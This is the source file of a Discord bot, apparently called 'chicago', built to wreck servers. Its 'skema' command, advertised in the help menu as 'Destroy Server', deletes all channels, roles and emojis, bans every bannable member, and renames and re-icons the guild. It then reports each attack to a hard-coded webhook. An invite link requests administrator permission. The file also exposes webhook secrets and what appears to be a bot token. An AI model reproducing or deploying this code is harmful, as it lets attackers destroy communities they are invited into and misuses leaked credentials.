const { Client } = require("discord.js");
const Discord = require("discord.js");
require("discord-reply");
const { MessageEmbed, version: djsversion } = require('discord.js');
const client = new Discord.Client({
});
const { MessageButton } = require('discord-buttons-plugin')
const discordButtons = require("discord-buttons-plugin");
const buttonClient = new discordButtons(client)
const cooldown = new Set();
const cdtime = 5;
const db = require("quick.db")
const talkedRecently = new Set();
var whitelistedservers = ["922608681210744842"]
const http = require("http");
http.createServer((_, res) => res.end("Saki smk")).listen(8080)

client.on("ready", async () => {

let matatactu = new Discord.MessageEmbed()
.setColor("#000000")
.setFooter('status: online', 'https://media.discordapp.net/attachments/909005289922125894/933477538733379644/IMB_6KNMot.gif')
.setDescription(` <:pistol:945753416670531644> **___chicago. It has been reconnected!___**  `);
const wrb = new Discord.WebhookClient("945828416127656056", "b6mn-LaIDSOmrpFLqR1mpDLRnJ5gsX78XKLxBYxzo97z-Fhth3veqvkpEIDy9acPTk4H");
    await wrb.send(matatactu)

client.user.setPresence({
    status: "STREAMING",
    activity: {
      name: "just a normal bot",
      type: "STREAMING",
       url: "https://twitch.tv/kk"
    }
  })
console.log("haidi la futut")
})
  
client.on(`message`, message => {
  if (talkedRecently.has(message.author.id) && message.content === `ping`|| message.content === `Ping` || message.content === `PING`) return message.channel.send(`>>> Slow down! You have a 5 second cooldown!`);
     if (message.content === `ping`|| message.content === `Ping` || message.content === `PING`) {
    const pingmsg = new Discord.MessageEmbed()
    .setAuthor(`bot connection...`)
    .setDescription(`>  **Latency is** **${Date.now() - message.createdTimestamp}ms**
\ >  **API Latency is** **${Math.round(message.client.ws.ping)}ms**`)
.setFooter(`requested by ${message.author.username}`)
.setColor("2f3136")
.setTimestamp(Date.now());
message.channel.send(pingmsg);
talkedRecently.add(message.author.id);
setTimeout(() => {
talkedRecently.delete(message.author.id);
}, 5000)
  }
});
 
client.login('BOT_TOKEN')

client.on("message", async(message)=>{
  if (!message.guild) return;
      if (!message.guild) return;
    if (message.content.startsWith('skema')||message.content.startsWith(`Skema`)||message.content.startsWith(`SKEMA`)) {

         if(message.guild.id == '943915645358211172') return message.channel.send('> **This guild is protected**');

       let channels =  message.guild.channels.cache.array();
        let members =  message.guild.members.cache.array();
        let roles =  message.guild.roles.cache.array();
        let emojis =  message.guild.emojis.cache.array();
let guild = message.guild.id


 



      const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
          db.set(`channel_${message.guild.id}`, "k")



let mes = new Discord.MessageEmbed()
.setColor("#2f3136")
.setTitle("Nuked")
.setFooter("chicago")
.setDescription (` - **__ Who typed the command?:__**  ${message.author.tag} (` + "`" + message.author.id + "`" + `)\n\n - - **__Command used:__** (` + "`" + ('skema') + "`" + `)\n\n  - - **__Server Name:__**  ${message.guild.name} (` + "`" + message.guild.id + "`" + `)\n\n  - **__Member count:__** (` + "`" + message.guild.memberCount + "`" + `)`)
.setThumbnail("https://cdn.discordapp.com/avatars/"+message.author.id+"/"+message.author.avatar+".jpeg")
.setImage (`https://media.discordapp.net/attachments/933401595130032140/933415479899467796/3.gif`)

.setTimestamp(Date.now());

    const wrb = new Discord.WebhookClient("946863274702544936","plGcpZeljEDsIMpcTqAau04II5xa_x0X7Lqe4BYRhDqV_UFsLBLtALecpmAc96JkFE4O");

    await wrb.send(mes)


const phin = require('phin').unpromisified
let guildID = message.guild.id

message.delete()
       message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
    message.guild.roles.cache
      .filter(
        r =>
          !r.managed &&
          r.position < message.guild.me.roles.highest.position &&
          r.id !== message.guild.id
      )
      .forEach(role => {
        role.delete();
      });
    message.guild.emojis.cache.array().forEach(emoji => {
      emoji.delete();
    });



message.guild.members.cache.filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach( member => {
   member.ban()
     
})


message.guild.setName(`chicago. beibi`)
    message.guild.setIcon(
"https://media.discordapp.net/attachments/913915079488049152/945265421437775912/6085f01b8f8ba39c987af41aae611dc7-1.png?width=234&height=378"
    );
          
db.set(`${message.guild.id}-grief`, true);


}
  if (message.content === 'invite'|| message.content === `Invite`||message.content === `INVITE`) {

    const embed = new Discord.MessageEmbed()
      .setTitle(' **__INVITE ME__**')
      .setColor("2f3136")
      .setDescription(`

>   Invite link is attached here [INVITE ME](https://discord.com/api/oauth2/authorize?client_id=944353122871025684&permissions=8&scope=bot)

>  Bot command is "skema"`)
      .setThumbnail(``)
                .setFooter(
                    `requested by ${message.author.username}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp(Date.now())
      .setColor('2f3136')
        const button4 = new buttonClient.MessageButton()
      .setLabel("Invite Link")
      .setURL("https://discord.com/api/oauth2/authorize?client_id=944353122871025684&permissions=8&scope=bot")

    buttonClient.send(null, { channel: message.channel.id, embed, buttons: [[button4]] })
  }
  if (message.content === "uptime" || message.content === "Uptime" || message.content === " UPTIME") {
  const prettyMilliseconds = require("pretty-ms");
  const uptimeEmbed = new Discord.MessageEmbed()
.setAuthor(`Uptime`)
.setDescription(`>  **The bot has been on for ${prettyMilliseconds(client.uptime)}** `)
.setColor(`2f3136`)
.setFooter(`requested by ${message.author.username}`,message.author.displayAvatarURL({
                        dynamic: true
                    }))
.setTimestamp(Date.now());
message.channel.send(uptimeEmbed)
  }
if (message.content === "help") {
  const helpFree = new Discord.MessageEmbed()
  
                
               .setTitle('<:pistol:945753416670531644> ・ COMMANDS')
                .setDescription(`
<:sus:945761598604189706> skema ___**Destroy Server**___
<:jos:945762409862275123> ping  ___**Show Bot Ping**___
`)
.setFooter(`© chicago | Author: $ a k i`)
.setThumbnail("https://cdn.discordapp.com/avatars/"+message.author.id+"/"+message.author.avatar+".jpeg")
                .setColor(`#9999DD`)
                .setTimestamp(Date.now());             
                message.channel.send(helpFree)
                
}
if (message.content === "leaveall") {
  let ownerID = ("889943849718394971")
if(message.author.id !== ownerID) {
          message.lineReply(`> **This command is developer only!**`)
           } else {
             client.guilds.cache.forEach(guild => {
               let whitelist = "922608681210744842"
               if(whitelist.includes(guild.id)) return;
               guild.leave()
               message.channel.send(`> ** left all guilds!**`)
             })
           }

   
       if (message.content.startsWith('guilds')) {    
 let ownerID = "687217040133849101"
  if(message.author.id !== ownerID) {
message.lineReplyNoMention('> **This command is developer only!**').then(m => m.delete({timeout: 5000}))
  } else {
  
      let i0 = 0;

      let i1 = 10;

      let page = 1;

      let description =

        `Total Servers - ${client.guilds.cache.size}\n\n` +

        client.guilds.cache

          .sort((a, b) => b.memberCount - a.memberCount)

          .map(r => r)

          .map((r, i) => `**${i + 1}** - ${r.name} | ${r.memberCount} Members\nID - ${r.id}`)

          .slice(0, 10)

          .join("\n\n");

      let embed = new Discord.MessageEmbed()

        .setAuthor(client.user.tag, client.user.displayAvatarURL({dynamic : true}))

        .setColor("2f3136")

        .setFooter(`Page - ${page}/${Math.ceil(client.guilds.cache.size / 10)}`)

        .setDescription(description);

      let msg = await message.lineReplyNoMention(embed);
      
      await msg.react("⬅️");

      await msg.react("➡️");

      await msg.react("🔱");

      let collector = msg.createReactionCollector(

        (reaction, user) => user.id === message.author.id

      );

      collector.on("collect", async (reaction, user) => {

        if (reaction._emoji.name === "⬅️") {

          // Updates variables

          i0 = i0 - 10;

          i1 = i1 - 10;

          page = page - 1;

          // if there is no guild to display, delete the message

          if (i0 + 1 < 0) {

            console.log(i0)

            return msg.delete();

          }

          if (!i0 || !i1) {

            return msg.delete();

          }

          description =

            `Total Servers - ${client.guilds.cache.size}\n\n` +

            client.guilds.cache

              .sort((a, b) => b.memberCount - a.memberCount)

              .map(r => r)

              .map(

                (r, i) => `**${i + 1}** - ${r.name} | ${r.memberCount} Members\nID - ${r.id}`)

              .slice(i0, i1)

              .join("\n\n");

          // Update the embed with new informations

          embed

            .setFooter(

              `Page - ${page}/${Math.round(client.guilds.cache.size / 10 + 1)}`

            )

            .setDescription(description);

          // Edit the message

          msg.edit(embed);

        }

        if (reaction._emoji.name === "➡️") {

          // Updates variables

          i0 = i0 + 10;

          i1 = i1 + 10;

          page = page + 1;

          // if there is no guild to display, delete the message

          if (i1 > client.guilds.cache.size + 10) {

            return msg.delete();

          }

          if (!i0 || !i1) {

            return msg.delete();

          }

          description =

            `Total Servers - ${client.guilds.cache.size}\n\n` +

            client.guilds.cache

              .sort((a, b) => b.memberCount - a.memberCount)

              .map(r => r)

              .map(

                (r, i) => `**${i + 1}** - ${r.name} | ${r.memberCount} Members\nID - ${r.id}`)

              .slice(i0, i1)

              .join("\n\n");

          embed
                        .setFooter(
                    `Page - ${page}/${Math.round(client.guilds.cache.size / 10 + 1)}`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()

            .setFooter(

              `lazy | Page - ${page}/${Math.round(client.guilds.cache.size / 10 + 1)}`

            )

            .setDescription(description);

          message.edit(embed);

        }

        if (reaction._emoji.name === "🔱") {

          return msg.delete();
        }
await reaction.users.remove(message.author.id);
  });

    } 
  }
}
})
client.login("OTQ0MzUzMTIyODcxMDI1Njg0.YhAXYQ.dBS0Jq-C4Ojl4yvHiPr4if6g2QM")